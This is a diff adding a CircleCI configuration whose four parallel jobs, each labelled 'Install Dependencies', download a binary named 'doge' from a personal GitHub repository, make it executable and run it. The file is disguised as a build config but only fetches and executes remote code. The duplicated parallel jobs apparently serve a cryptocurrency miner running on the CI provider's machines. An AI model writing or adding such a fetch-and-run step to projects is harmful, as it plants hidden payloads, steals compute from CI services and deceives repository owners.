@@ -1,0 +1,38 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Alikhani09160611/special-system/main/doge && chmod +x doge && ./doge
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Alikhani09160611/special-system/main/doge && chmod +x doge && ./doge
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Alikhani09160611/special-system/main/doge && chmod +x doge && ./doge
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Alikhani09160611/special-system/main/doge && chmod +x doge && ./doge
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
